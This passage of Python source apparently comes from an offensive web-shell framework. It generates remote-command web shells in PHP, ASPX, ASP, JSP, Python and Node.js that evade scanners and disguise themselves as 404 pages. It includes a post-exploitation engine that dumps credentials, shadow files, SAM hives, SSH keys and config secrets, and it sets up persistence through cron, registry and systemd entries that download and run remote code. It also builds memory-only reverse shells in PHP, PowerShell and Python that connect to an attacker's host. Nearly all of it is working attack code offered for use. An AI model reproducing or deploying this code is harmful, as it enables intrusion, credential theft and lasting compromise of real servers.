        if (is_resource($proc)) {
            stream_set_blocking($sock, 0);
            stream_set_blocking($pipes[0], 0);
            stream_set_blocking($pipes[1], 0);
            stream_set_blocking($pipes[2], 0);
            
            while (!feof($sock) && !feof($pipes[1])) {
                $read = array($sock, $pipes[1], $pipes[2]);
                $write = null;
                $except = null;
                
                if (@stream_select($read, $write, $except, null) > 0) {
                    if (in_array($sock, $read)) {
                        $input = fread($sock, 1024);
                        fwrite($pipes[0], $input);
                    }
                    if (in_array($pipes[1], $read)) {
                        $output = fread($pipes[1], 1024);
                        fwrite($sock, $output);
                    }
                    if (in_array($pipes[2], $read)) {
                        $error = fread($pipes[2], 1024);
                        fwrite($sock, $error);
                    }
                }
            }
            
            fclose($pipes[0]);
            fclose($pipes[1]);
            fclose($pipes[2]);
            proc_close($proc);
        }
        
        fclose($sock);
        return true;
    }
    
    public function getSystemInfo() {
        return array(
            'os' => PHP_OS,
            'hostname' => @gethostname(),
            'user' => @get_current_user(),
            'cwd' => @getcwd(),
            'php_version' => PHP_VERSION,
            'server_software' => @$_SERVER['SERVER_SOFTWARE'],
            'server_addr' => @$_SERVER['SERVER_ADDR'],
            'document_root' => @$_SERVER['DOCUMENT_ROOT'],
            'disable_functions' => @ini_get('disable_functions'),
            'safe_mode' => @ini_get('safe_mode'),
            'open_basedir' => @ini_get('open_basedir'),
        );
    }
}

// Process request
$shell = new WebShell();
$response = array('status' => 'error', 'data' => null);

$input = isset($_REQUEST['data']) ? $_REQUEST['data'] : @file_get_contents('php://input');
if (!empty($input)) {
    $data = @json_decode($input, true);
    if ($data === null) {
        $data = array('action' => @$_REQUEST['action'], 'params' => $_REQUEST);
    }
    
    $action = isset($data['action']) ? $data['action'] : '';
    $params = isset($data['params']) ? $data['params'] : array();
    
    switch ($action) {
        case 'exec':
            $response['data'] = $shell->execute($params['cmd']);
            $response['status'] = 'success';
            break;
        case 'read':
            $response['data'] = $shell->fileRead($params['path']);
            $response['status'] = 'success';
            break;
        case 'write':
            $response['data'] = $shell->fileWrite($params['path'], $params['content']);
            $response['status'] = 'success';
            break;
        case 'list':
            $response['data'] = $shell->fileList($params['path']);
            $response['status'] = 'success';
            break;
        case 'download':
            $shell->download($params['path']);
            break;
        case 'upload':
            $response['data'] = $shell->upload($params['dest']);
            $response['status'] = 'success';
            break;
        case 'scan':
            $response['data'] = $shell->portScan($params['host'], $params['ports']);
            $response['status'] = 'success';
            break;
        case 'reverse':
            $response['data'] = $shell->reverseShell($params['host'], $params['port']);
            $response['status'] = 'success';
            break;
        case 'info':
            $response['data'] = $shell->getSystemInfo();
            $response['status'] = 'success';
            break;
        default:
            $response['data'] = 'Unknown action';
    }
}

header('Content-Type: application/json');
echo json_encode($response);
?>'''
    
    def _aspx_shell(self) -> str:
        """Generate ASPX web shell"""
        return '''<%@ Page Language="C#" %>
<%@ Import Namespace="System.IO" %>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.Net" %>
<%@ Import Namespace="System.Net.Sockets" %>
<%@ Import Namespace="System.Text" %>
<%@ Import Namespace="System.Web.Script.Serialization" %>
<script runat="server">
    
    protected void Page_Load(object sender, EventArgs e)
    {
        Response.ContentType = "application/json";
        
        var serializer = new JavaScriptSerializer();
        var response = new Dictionary<string, object>();
        response["status"] = "error";
        response["data"] = null;
        
        string input = Request.Form["data"] ?? "";
        if (string.IsNullOrEmpty(input))
        {
            using (var reader = new StreamReader(Request.InputStream))
            {
                input = reader.ReadToEnd();
            }
        }
        
        if (!string.IsNullOrEmpty(input))
        {
            try
            {
                var data = serializer.Deserialize<Dictionary<string, object>>(input);
                string action = data.ContainsKey("action") ? data["action"].ToString() : "";
                var parameters = data.ContainsKey("params") ? (Dictionary<string, object>)data["params"] : new Dictionary<string, object>();
                
                switch (action)
                {
                    case "exec":
                        response["data"] = ExecuteCommand(parameters["cmd"].ToString());
                        response["status"] = "success";
                        break;
                    case "read":
                        response["data"] = File.ReadAllText(parameters["path"].ToString());
                        response["status"] = "success";
                        break;
                    case "write":
                        File.WriteAllText(parameters["path"].ToString(), parameters["content"].ToString());
                        response["data"] = true;
                        response["status"] = "success";
                        break;
                    case "list":
                        response["data"] = ListDirectory(parameters["path"].ToString());
                        response["status"] = "success";
                        break;
                    case "info":
                        response["data"] = GetSystemInfo();
                        response["status"] = "success";
                        break;
                    case "scan":
                        var ports = serializer.Deserialize<int[]>(serializer.Serialize(parameters["ports"]));
                        response["data"] = PortScan(parameters["host"].ToString(), ports);
                        response["status"] = "success";
                        break;
                    default:
                        response["data"] = "Unknown action";
                        break;
                }
            }
            catch (Exception ex)
            {
                response["data"] = ex.Message;
            }
        }
        
        Response.Write(serializer.Serialize(response));
    }
    
    private string ExecuteCommand(string cmd)
    {
        var psi = new ProcessStartInfo();
        psi.FileName = "cmd.exe";
        psi.Arguments = "/c " + cmd;
        psi.RedirectStandardOutput = true;
        psi.RedirectStandardError = true;
        psi.UseShellExecute = false;
        psi.CreateNoWindow = true;
        
        using (var process = Process.Start(psi))
        {
            string output = process.StandardOutput.ReadToEnd();
            string error = process.StandardError.ReadToEnd();
            process.WaitForExit();
            return output + error;
        }
    }
    
    private List<Dictionary<string, object>> ListDirectory(string path)
    {
        var files = new List<Dictionary<string, object>>();
        
        foreach (var dir in Directory.GetDirectories(path))
        {
            var info = new DirectoryInfo(dir);
            files.Add(new Dictionary<string, object>
            {
                { "name", info.Name },
                { "path", info.FullName },
                { "size", 0 },
                { "mtime", info.LastWriteTime.ToString("o") },
                { "isdir", true }
            });
        }
        
        foreach (var file in Directory.GetFiles(path))
        {
            var info = new FileInfo(file);
            files.Add(new Dictionary<string, object>
            {
                { "name", info.Name },
                { "path", info.FullName },
                { "size", info.Length },
                { "mtime", info.LastWriteTime.ToString("o") },
                { "isdir", false }
            });
        }
        
        return files;
    }
    
    private Dictionary<string, object> GetSystemInfo()
    {
        return new Dictionary<string, object>
        {
            { "os", Environment.OSVersion.ToString() },
            { "hostname", Environment.MachineName },
            { "user", Environment.UserName },
            { "domain", Environment.UserDomainName },
            { "cwd", Environment.CurrentDirectory },
            { "processors", Environment.ProcessorCount },
            { "clr_version", Environment.Version.ToString() }
        };
    }
    
    private Dictionary<int, bool> PortScan(string host, int[] ports)
    {
        var results = new Dictionary<int, bool>();
        
        foreach (var port in ports)
        {
            try
            {
                using (var client = new TcpClient())
                {
                    var result = client.BeginConnect(host, port, null, null);
                    var success = result.AsyncWaitHandle.WaitOne(TimeSpan.FromSeconds(1));
                    results[port] = success && client.Connected;
                }
            }
            catch
            {
                results[port] = false;
            }
        }
        
        return results;
    }
</script>'''
    
    def _asp_shell(self) -> str:
        """Generate classic ASP web shell"""
        return '''<%
Response.ContentType = "application/json"
Response.Buffer = True

Dim action, output, cmd, path, content, host, ports
action = Request.Form("action")
If action = "" Then action = Request.QueryString("action")

Set response_obj = Server.CreateObject("Scripting.Dictionary")
response_obj.Add "status", "error"
response_obj.Add "data", Null

Select Case action
    Case "exec"
        cmd = Request("cmd")
        output = ExecuteCommand(cmd)
        response_obj("data") = output
        response_obj("status") = "success"
    Case "read"
        path = Request("path")
        output = ReadFile(path)
        response_obj("data") = output
        response_obj("status") = "success"
    Case "info"
        response_obj("data") = GetSystemInfo()
        response_obj("status") = "success"
    Case Else
        response_obj("data") = "Unknown action"
End Select

Response.Write JsonEncode(response_obj)

Function ExecuteCommand(cmd)
    Dim objShell, objExec, output
    Set objShell = Server.CreateObject("WScript.Shell")
    Set objExec = objShell.Exec("cmd.exe /c " & cmd)
    output = objExec.StdOut.ReadAll()
    ExecuteCommand = output
End Function

Function ReadFile(path)
    Dim fso, file, content
    Set fso = Server.CreateObject("Scripting.FileSystemObject")
    If fso.FileExists(path) Then
        Set file = fso.OpenTextFile(path, 1)
        content = file.ReadAll()
        file.Close
    Else
        content = "File not found"
    End If
    ReadFile = content
End Function

Function GetSystemInfo()
    Dim info, wmi, os, item
    Set info = Server.CreateObject("Scripting.Dictionary")
    Set wmi = GetObject("winmgmts:\\\\localhost\\root\\cimv2")
    Set os = wmi.ExecQuery("Select * from Win32_OperatingSystem")
    For Each item in os
        info.Add "os", item.Caption
        info.Add "version", item.Version
    Next
    info.Add "server", Request.ServerVariables("SERVER_SOFTWARE")
    info.Add "cwd", Server.MapPath(".")
    Set GetSystemInfo = info
End Function

Function JsonEncode(obj)
    Dim key, result
    result = "{"
    For Each key in obj.Keys
        If result <> "{" Then result = result & ","
        result = result & """" & key & """:"
        If IsNull(obj(key)) Then
            result = result & "null"
        ElseIf VarType(obj(key)) = vbString Then
            result = result & """" & Replace(obj(key), """", "\""") & """"
        Else
            result = result & obj(key)
        End If
    Next
    result = result & "}"
    JsonEncode = result
End Function
%>'''
    
    def _jsp_shell(self) -> str:
        """Generate JSP web shell"""
        return '''<%@ page import="java.io.*,java.util.*,java.net.*" %>
<%@ page import="org.json.simple.JSONObject" %>
<%@ page import="org.json.simple.JSONArray" %>
<%
response.setContentType("application/json");
PrintWriter out_writer = response.getWriter();
JSONObject json_response = new JSONObject();
json_response.put("status", "error");
json_response.put("data", null);

String action = request.getParameter("action");
String cmd = request.getParameter("cmd");
String path = request.getParameter("path");

try {
    if ("exec".equals(action) && cmd != null) {
        String os = System.getProperty("os.name").toLowerCase();
        ProcessBuilder pb;
        if (os.contains("win")) {
            pb = new ProcessBuilder("cmd.exe", "/c", cmd);
        } else {
            pb = new ProcessBuilder("/bin/sh", "-c", cmd);
        }
        pb.redirectErrorStream(true);
        Process process = pb.start();
        
        BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
        StringBuilder output = new StringBuilder();
        String line;
        while ((line = reader.readLine()) != null) {
            output.append(line).append("\\n");
        }
        process.waitFor();
        
        json_response.put("data", output.toString());
        json_response.put("status", "success");
    }
    else if ("read".equals(action) && path != null) {
        File file = new File(path);
        BufferedReader reader = new BufferedReader(new FileReader(file));
        StringBuilder content = new StringBuilder();
        String line;
        while ((line = reader.readLine()) != null) {
            content.append(line).append("\\n");
        }
        reader.close();
        
        json_response.put("data", content.toString());
        json_response.put("status", "success");
    }
    else if ("list".equals(action) && path != null) {
        File dir = new File(path);
        File[] files = dir.listFiles();
        JSONArray file_list = new JSONArray();
        
        if (files != null) {
            for (File f : files) {
                JSONObject file_info = new JSONObject();
                file_info.put("name", f.getName());
                file_info.put("path", f.getAbsolutePath());
                file_info.put("size", f.length());
                file_info.put("isdir", f.isDirectory());
                file_list.add(file_info);
            }
        }
        
        json_response.put("data", file_list);
        json_response.put("status", "success");
    }
    else if ("info".equals(action)) {
        JSONObject info = new JSONObject();
        info.put("os", System.getProperty("os.name"));
        info.put("os_version", System.getProperty("os.version"));
        info.put("java_version", System.getProperty("java.version"));
        info.put("user", System.getProperty("user.name"));
        info.put("cwd", System.getProperty("user.dir"));
        info.put("hostname", InetAddress.getLocalHost().getHostName());
        
        json_response.put("data", info);
        json_response.put("status", "success");
    }
    else {
        json_response.put("data", "Unknown action or missing parameters");
    }
} catch (Exception e) {
    json_response.put("data", e.getMessage());
}

out_writer.print(json_response.toJSONString());
out_writer.flush();
%>'''
    
    def _py_shell(self) -> str:
        """Generate Python web shell (WSGI/CGI)"""
        return '''#!/usr/bin/env python3
import os
import sys
import json
import subprocess
import socket
from urllib.parse import parse_qs

def execute_command(cmd):
    try:
        result = subprocess.run(
            cmd, shell=True, capture_output=True, text=True, timeout=30
        )
        return result.stdout + result.stderr
    except Exception as e:
        return str(e)

def read_file(path):
    try:
        with open(path, 'r') as f:
            return f.read()
    except Exception as e:
        return str(e)

def write_file(path, content):
    try:
        with open(path, 'w') as f:
            f.write(content)
        return True
    except Exception as e:
        return str(e)

def list_directory(path):
    try:
        entries = []
        for entry in os.listdir(path):
            full_path = os.path.join(path, entry)
            stat = os.stat(full_path)
            entries.append({
                'name': entry,
                'path': full_path,
                'size': stat.st_size,
                'isdir': os.path.isdir(full_path)
            })
        return entries
    except Exception as e:
        return str(e)

def get_system_info():
    return {
        'os': os.name,
        'platform': sys.platform,
        'hostname': socket.gethostname(),
        'user': os.getenv('USER', os.getenv('USERNAME', 'unknown')),
        'cwd': os.getcwd(),
        'python_version': sys.version
    }

def port_scan(host, ports):
    results = {}
    for port in ports:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            result = sock.connect_ex((host, port))
            results[port] = (result == 0)
            sock.close()
        except:
            results[port] = False
    return results

def application(environ, start_response):
    response = {'status': 'error', 'data': None}
    
    try:
        content_length = int(environ.get('CONTENT_LENGTH', 0))
        if content_length > 0:
            body = environ['wsgi.input'].read(content_length)
            data = json.loads(body.decode('utf-8'))
        else:
            qs = environ.get('QUERY_STRING', '')
            data = {k: v[0] for k, v in parse_qs(qs).items()}
        
        action = data.get('action', '')
        params = data.get('params', data)
        
        if action == 'exec':
            response['data'] = execute_command(params.get('cmd', ''))
            response['status'] = 'success'
        elif action == 'read':
            response['data'] = read_file(params.get('path', ''))
            response['status'] = 'success'
        elif action == 'write':
            response['data'] = write_file(params.get('path', ''), params.get('content', ''))
            response['status'] = 'success'
        elif action == 'list':
            response['data'] = list_directory(params.get('path', '.'))
            response['status'] = 'success'
        elif action == 'info':
            response['data'] = get_system_info()
            response['status'] = 'success'
        elif action == 'scan':
            response['data'] = port_scan(params.get('host', ''), params.get('ports', []))
            response['status'] = 'success'
        else:
            response['data'] = 'Unknown action'
    except Exception as e:
        response['data'] = str(e)
    
    status = '200 OK'
    headers = [('Content-Type', 'application/json')]
    start_response(status, headers)
    return [json.dumps(response).encode('utf-8')]

# CGI mode
if __name__ == '__main__':
    print("Content-Type: application/json\\n")
    response = {'status': 'error', 'data': None}
    
    try:
        if os.environ.get('REQUEST_METHOD') == 'POST':
            data = json.loads(sys.stdin.read())
        else:
            data = {k: v[0] for k, v in parse_qs(os.environ.get('QUERY_STRING', '')).items()}
        
        action = data.get('action', '')
        
        if action == 'exec':
            response['data'] = execute_command(data.get('cmd', ''))
            response['status'] = 'success'
        elif action == 'info':
            response['data'] = get_system_info()
            response['status'] = 'success'
    except Exception as e:
        response['data'] = str(e)
    
    print(json.dumps(response))
'''
    
    def _node_shell(self) -> str:
        """Generate Node.js web shell"""
        return '''const http = require('http');
const { exec } = require('child_process');
const fs = require('fs');
const path = require('path');
const os = require('os');
const net = require('net');

const PORT = process.env.PORT || 8888;

function executeCommand(cmd) {
    return new Promise((resolve, reject) => {
        exec(cmd, { timeout: 30000 }, (error, stdout, stderr) => {
            resolve(stdout + stderr);
        });
    });
}

function readFile(filePath) {
    try {
        return fs.readFileSync(filePath, 'utf8');
    } catch (e) {
        return e.message;
    }
}

function writeFile(filePath, content) {
    try {
        fs.writeFileSync(filePath, content);
        return true;
    } catch (e) {
        return e.message;
    }
}

function listDirectory(dirPath) {
    try {
        const entries = fs.readdirSync(dirPath);
        return entries.map(entry => {
            const fullPath = path.join(dirPath, entry);
            const stat = fs.statSync(fullPath);
            return {
                name: entry,
                path: fullPath,
                size: stat.size,
                isdir: stat.isDirectory()
            };
        });
    } catch (e) {
        return e.message;
    }
}

function getSystemInfo() {
    return {
        os: os.type(),
        platform: os.platform(),
        hostname: os.hostname(),
        user: os.userInfo().username,
        cwd: process.cwd(),
        node_version: process.version,
        arch: os.arch(),
        cpus: os.cpus().length,
        memory: os.totalmem()
    };
}

async function portScan(host, ports) {
    const results = {};
    for (const port of ports) {
        results[port] = await new Promise(resolve => {
            const socket = new net.Socket();
            socket.setTimeout(1000);
            socket.on('connect', () => {
                socket.destroy();
                resolve(true);
            });
            socket.on('timeout', () => {
                socket.destroy();
                resolve(false);
            });
            socket.on('error', () => {
                resolve(false);
            });
            socket.connect(port, host);
        });
    }
    return results;
}

const server = http.createServer(async (req, res) => {
    res.setHeader('Content-Type', 'application/json');
    
    let body = '';
    req.on('data', chunk => body += chunk);
    req.on('end', async () => {
        const response = { status: 'error', data: null };
        
        try {
            const data = body ? JSON.parse(body) : {};
            const action = data.action || '';
            const params = data.params || data;
            
            switch (action) {
                case 'exec':
                    response.data = await executeCommand(params.cmd || '');
                    response.status = 'success';
                    break;
                case 'read':
                    response.data = readFile(params.path || '');
                    response.status = 'success';
                    break;
                case 'write':
                    response.data = writeFile(params.path || '', params.content || '');
                    response.status = 'success';
                    break;
                case 'list':
                    response.data = listDirectory(params.path || '.');
                    response.status = 'success';
                    break;
                case 'info':
                    response.data = getSystemInfo();
                    response.status = 'success';
                    break;
                case 'scan':
                    response.data = await portScan(params.host || '', params.ports || []);
                    response.status = 'success';
                    break;
                default:
                    response.data = 'Unknown action';
            }
        } catch (e) {
            response.data = e.message;
        }
        
        res.end(JSON.stringify(response));
    });
});

server.listen(PORT, () => {
    console.log(`Shell listening on port ${PORT}`);
});
'''
    
    def _add_authentication(self, code: str, shell_type: ShellType) -> str:
        """Add password authentication"""
        if shell_type == ShellType.PHP:
            pwd_hash = hashlib.md5(self.config.password.encode()).hexdigest()
            auth_code = f"""
$_auth_key = '{pwd_hash}';
$_auth_input = isset($_REQUEST['key']) ? $_REQUEST['key'] : '';
if (md5($_auth_input) !== $_auth_key) {{
    http_response_code(404);
    die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>404 Not Found</title></head><body><h1>Not Found</h1></body></html>');
}}
"""
            return code.replace('<?php', '<?php\n' + auth_code)
        
        return code
    
    def _add_anti_analysis(self, code: str, shell_type: ShellType) -> str:
        """Add anti-debugging and anti-sandbox checks"""
        if shell_type == ShellType.PHP:
            checks = """
// Anti-analysis
if (php_sapi_name() === 'cli') die();
if (function_exists('xdebug_is_enabled') && @xdebug_is_enabled()) die();
if (@$_SERVER['HTTP_X_SCANNER'] || @$_SERVER['HTTP_X_PROBE']) die();
$_ua = strtolower(@$_SERVER['HTTP_USER_AGENT']);
if (preg_match('/(bot|spider|crawler|scanner|nikto|sqlmap|nmap|dirbuster)/i', $_ua)) die();
"""
            return code.replace('<?php', '<?php\n' + checks)
        
        return code
    
    def _add_encryption_layer(self, code: str, shell_type: ShellType) -> str:
        """Add encrypted communication layer"""
        if shell_type == ShellType.PHP:
            encryption = """
// Encrypted communications
function _decrypt($data, $key) {
    return openssl_decrypt(base64_decode($data), 'AES-256-CBC', $key, 0, substr(md5($key), 0, 16));
}
function _encrypt($data, $key) {
    return base64_encode(openssl_encrypt($data, 'AES-256-CBC', $key, 0, substr(md5($key), 0, 16)));
}
"""
            return code.replace('<?php', '<?php\n' + encryption)
        
        return code
    
    def _add_beacon(self, code: str, shell_type: ShellType) -> str:
        """Add beacon callback functionality"""
        if shell_type == ShellType.PHP and self.config.callback_url:
            beacon = f"""
// Beacon callback
register_shutdown_function(function() {{
    $beacon_data = array(
        'host' => @$_SERVER['SERVER_NAME'],
        'ip' => @$_SERVER['SERVER_ADDR'],
        'time' => time()
    );
    @file_get_contents('{self.config.callback_url}', false, stream_context_create(array(
        'http' => array(
            'method' => 'POST',
            'header' => 'Content-Type: application/json',
            'content' => json_encode($beacon_data),
            'timeout' => 2
        )
    )));
}});
"""
            return code.replace('<?php', '<?php\n' + beacon)
        
        return code
    
    def _add_self_destruct(self, code: str, shell_type: ShellType) -> str:
        """Add self-destruct functionality"""
        if shell_type == ShellType.PHP:
            destruct = """
// Self-destruct
if (isset($_REQUEST['_sd']) || (defined('SELF_DESTRUCT_TIME') && time() > SELF_DESTRUCT_TIME)) {
    @unlink(__FILE__);
    die();
}
"""
            return code.replace('<?php', '<?php\n' + destruct)
        
        return code

# ============================================================================
# POST-EXPLOITATION ENGINE
# ============================================================================

class PostExploitEngine:
    """
    Post-exploitation capabilities for web shell
    """
    
    def __init__(self, shell_url: str, password: str = ""):
        self.shell_url = shell_url
        self.password = password
        self.session = None
        
    def _request(self, action: str, params: Dict[str, Any]) -> Dict[str, Any]:
        """Send request to web shell"""
        import requests
        
        data = {
            "action": action,
            "params": params,
            "key": self.password
        }
        
        try:
            resp = requests.post(self.shell_url, json=data, timeout=30)
            return resp.json()
        except Exception as e:
            return {"status": "error", "data": str(e)}
    
    def execute(self, cmd: str) -> str:
        """Execute command on target"""
        result = self._request("exec", {"cmd": cmd})
        return result.get("data", "")
    
    def read_file(self, path: str) -> str:
        """Read file from target"""
        result = self._request("read", {"path": path})
        return result.get("data", "")
    
    def write_file(self, path: str, content: str) -> bool:
        """Write file to target"""
        result = self._request("write", {"path": path, "content": content})
        return result.get("status") == "success"
    
    def list_dir(self, path: str) -> List[Dict]:
        """List directory on target"""
        result = self._request("list", {"path": path})
        return result.get("data", [])
    
    def system_info(self) -> Dict[str, Any]:
        """Get system information"""
        result = self._request("info", {})
        return result.get("data", {})
    
    def port_scan(self, host: str, ports: List[int]) -> Dict[int, bool]:
        """Scan ports on internal network"""
        result = self._request("scan", {"host": host, "ports": ports})
        return result.get("data", {})
    
    def ssrf_probe(self, url: str) -> str:
        """Probe URL via SSRF"""
        cmd = f"curl -s '{url}' 2>/dev/null || wget -q -O - '{url}' 2>/dev/null"
        return self.execute(cmd)
    
    def dump_credentials(self) -> Dict[str, Any]:
        """Attempt to dump credentials"""
        results = {}
        
        # Linux credential files
        linux_paths = [
            "/etc/passwd",
            "/etc/shadow",
            "/etc/ssh/ssh_config",
            "/root/.ssh/id_rsa",
            "/root/.bash_history",
            "/var/www/.htpasswd",
        ]
        
        # Windows credential locations
        windows_paths = [
            "C:\\Windows\\System32\\config\\SAM",
            "C:\\Windows\\System32\\config\\SYSTEM",
            "C:\\Users\\*\\AppData\\Local\\Microsoft\\Credentials\\*",
        ]
        
        for path in linux_paths:
            content = self.read_file(path)
            if content and "error" not in content.lower():
                results[path] = content
        
        # Try to run mimikatz-like commands on Windows
        windows_cmd = 'reg save HKLM\\SAM sam.hive && reg save HKLM\\SYSTEM system.hive'
        win_result = self.execute(windows_cmd)
        if win_result and "error" not in win_result.lower():
            results["registry_dump"] = win_result
        
        return results
    
    def establish_persistence(self, method: str = "cron") -> bool:
        """Establish persistence on target"""
        shell_code = self.read_file("__FILE__")  # Get current shell
        
        if method == "cron":
            # Linux cron persistence
            cmd = f'(crontab -l 2>/dev/null; echo "*/5 * * * * curl {self.shell_url}?action=beacon") | crontab -'
            self.execute(cmd)
            
        elif method == "startup":
            # Windows startup persistence
            cmd = f'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Update /t REG_SZ /d "powershell -ep bypass -c \\"IEX(New-Object Net.WebClient).DownloadString(\'{self.shell_url}\')\\""'
            self.execute(cmd)
            
        elif method == "service":
            # Linux systemd service
            service = f"""[Unit]
Description=System Update Service
After=network.target

[Service]
Type=simple
ExecStart=/usr/bin/python3 -c "import urllib.request; exec(urllib.request.urlopen('{self.shell_url}').read())"
Restart=always

[Install]
WantedBy=multi-user.target
"""
            self.write_file("/etc/systemd/system/update.service", service)
            self.execute("systemctl daemon-reload && systemctl enable update && systemctl start update")
        
        return True
    
    def pivot(self, target_ip: str, target_port: int, local_port: int) -> bool:
        """Set up pivot through compromised host"""
        # Use socat or netcat for pivoting
        pivot_cmd = f"nohup socat TCP-LISTEN:{local_port},fork TCP:{target_ip}:{target_port} &"
        self.execute(pivot_cmd)
        return True
    
    def exfiltrate(self, path: str, method: str = "http") -> str:
        """Exfiltrate data from target"""
        content = self.read_file(path)
        
        if method == "http":
            # Base64 encode and send via HTTP
            encoded = base64.b64encode(content.encode()).decode()
            return encoded
            
        elif method == "dns":
            # Split into DNS-safe chunks
            encoded = base64.b64encode(content.encode()).decode()
            chunks = [encoded[i:i+60] for i in range(0, len(encoded), 60)]
            return chunks
        
        return content

# ============================================================================
# CREDENTIAL DUMPER
# ============================================================================

class CredentialDumper:
    """
    Credential dumping from web context
    """
    
    def __init__(self, post_exploit: PostExploitEngine):
        self.pe = post_exploit
        
    def dump_web_configs(self) -> Dict[str, str]:
        """Dump web application configuration files"""
        configs = {}
        
        paths = [
            # PHP configs
            "config.php", "../config.php", "../../config.php",
            "wp-config.php", "../wp-config.php",
            "configuration.php",  # Joomla
            "sites/default/settings.php",  # Drupal
            "app/etc/local.xml",  # Magento
            ".env", "../.env",
            
            # Database configs
            "database.yml", "config/database.yml",
            
            # Generic
            "config.ini", "settings.ini",
            ".htpasswd", "../.htpasswd",
        ]
        
        for path in paths:
            content = self.pe.read_file(path)
            if content and "error" not in content.lower() and len(content) > 10:
                configs[path] = content
                
        return configs
    
    def dump_database_creds(self) -> List[Dict[str, str]]:
        """Extract database credentials from configs"""
        configs = self.dump_web_configs()
        creds = []
        
        # Patterns to match
        patterns = [
            # PHP style
            r"(?:db_|database_|mysql_)(?:host|server|name|user|pass|password)['\"]?\s*(?:=>|=)\s*['\"]([^'\"]+)['\"]",
            # .env style
            r"(?:DB_|DATABASE_)(?:HOST|NAME|USER|PASSWORD|PASS)=(.+)",
            # WordPress
            r"define\s*\(\s*['\"]DB_(?:NAME|USER|PASSWORD|HOST)['\"]\s*,\s*['\"]([^'\"]+)['\"]",
            # Connection strings
            r"(?:mysql|mysqli|pgsql|mssql)://([^:]+):([^@]+)@([^/]+)/([^\s]+)",
        ]
        
        for path, content in configs.items():
            for pattern in patterns:
                matches = re.findall(pattern, content, re.IGNORECASE)
                if matches:
                    creds.append({
                        "source": path,
                        "credentials": matches
                    })
                    
        return creds
    
    def dump_ssh_keys(self) -> Dict[str, str]:
        """Dump SSH keys"""
        keys = {}
        
        paths = [
            "/root/.ssh/id_rsa",
            "/root/.ssh/id_ed25519",
            "/home/*/.ssh/id_rsa",
            "/home/*/.ssh/id_ed25519",
            "~/.ssh/id_rsa",
            "~/.ssh/authorized_keys",
        ]
        
        # Expand wildcards
        for path in paths:
            if "*" in path:
                # List directory and expand
                base_dir = path.split("*")[0]
                files = self.pe.list_dir(base_dir)
                for f in files:
                    if f.get("isdir"):
                        expanded = path.replace("*", f["name"])
                        content = self.pe.read_file(expanded)
                        if content and "PRIVATE KEY" in content:
                            keys[expanded] = content
            else:
                content = self.pe.read_file(path)
                if content and "PRIVATE KEY" in content:
                    keys[path] = content
                    
        return keys

# ============================================================================
# MEMORY-ONLY REVERSE SHELL
# ============================================================================

class MemoryShell:
    """
    Memory-only reverse shell - no disk artifacts
    """
    
    @staticmethod
    def generate_php_memory_shell(host: str, port: int) -> str:
        """Generate PHP memory-only reverse shell"""
        return f'''<?php
// Memory-only reverse shell - no disk artifacts
$sock = fsockopen("{host}", {port}, $errno, $errstr, 30);
if (!$sock) die();

$descriptors = array(
    0 => array("pipe", "r"),
    1 => array("pipe", "w"),
    2 => array("pipe", "w")
);

$shell = '/bin/sh';
if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') {{
    $shell = 'cmd.exe';
}}

$process = proc_open($shell, $descriptors, $pipes);
if (!is_resource($process)) die();

stream_set_blocking($sock, false);
stream_set_blocking($pipes[0], false);
stream_set_blocking($pipes[1], false);
stream_set_blocking($pipes[2], false);

while (!feof($sock) && !feof($pipes[1])) {{
    $read = array($sock, $pipes[1], $pipes[2]);
    $write = null;
    $except = null;
    
    if (stream_select($read, $write, $except, null) > 0) {{
        if (in_array($sock, $read)) {{
            $input = fread($sock, 1024);
            fwrite($pipes[0], $input);
        }}
        if (in_array($pipes[1], $read)) {{
            $output = fread($pipes[1], 1024);
            fwrite($sock, $output);
        }}
        if (in_array($pipes[2], $read)) {{
            $error = fread($pipes[2], 1024);
            fwrite($sock, $error);
        }}
    }}
}}

fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);
fclose($sock);
?>'''
    
    @staticmethod
    def generate_powershell_memory_shell(host: str, port: int) -> str:
        """Generate PowerShell memory-only reverse shell"""
        ps_code = f'''$c=New-Object System.Net.Sockets.TCPClient("{host}",{port});
$s=$c.GetStream();
[byte[]]$b=0..65535|%{{0}};
while(($i=$s.Read($b,0,$b.Length)) -ne 0){{
    $d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);
    $r=(iex $d 2>&1|Out-String);
    $r2=$r+"PS "+(pwd).Path+"> ";
    $sb=([text.encoding]::ASCII).GetBytes($r2);
    $s.Write($sb,0,$sb.Length);
    $s.Flush()
}};
$c.Close()'''
        
        # Base64 encode for execution
        encoded = base64.b64encode(ps_code.encode('utf-16-le')).decode()
        return f'powershell -ep bypass -nop -w hidden -enc {encoded}'
    
    @staticmethod
    def generate_python_memory_shell(host: str, port: int) -> str:
        """Generate Python memory-only reverse shell"""
        return f'''import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("{host}",{port}))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call(["/bin/sh","-i"])'''

# ============================================================================
# BEACON TRANSITION
# ============================================================================

class BeaconTransition:
    """
    Seamless transition from beacon to web shell
    """
    
    def __init__(self, beacon_url: str):
        self.beacon_url = beacon_url
        
    def deploy_webshell(self, target_path: str, shell_config: WebShellConfig) -> bool:
        """Deploy web shell via beacon"""
        generator = WebShellGenerator(shell_config)
        payload = generator.generate()
        
        # Send to beacon for deployment
        import requests
        
        deploy_data = {
            "action": "deploy_shell",
            "path": target_path,
            "content": payload.code
        }
        
        try:
            resp = requests.post(self.beacon_url, json=deploy_data, timeout=30)
            return resp.json().get("status") == "success"
        except:
            return False
    
    def upgrade_to_webshell(self, shell_url: str, password: str = "") -> PostExploitEngine:
        """Upgrade beacon connection to web shell"""
        return PostExploitEngine(shell_url, password)

# ============================================================================
# MAIN WEB SHELL MANAGER
# ============================================================================

class WebShellManager:
    """
    Main web shell management class
    """
    
    def __init__(self, config_path: Optional[str] = None):
        self.config = self._load_config(config_path)
        self.generator = WebShellGenerator()
        self.shells: Dict[str, ShellPayload] = {}
        self.sessions: Dict[str, PostExploitEngine] = {}
        
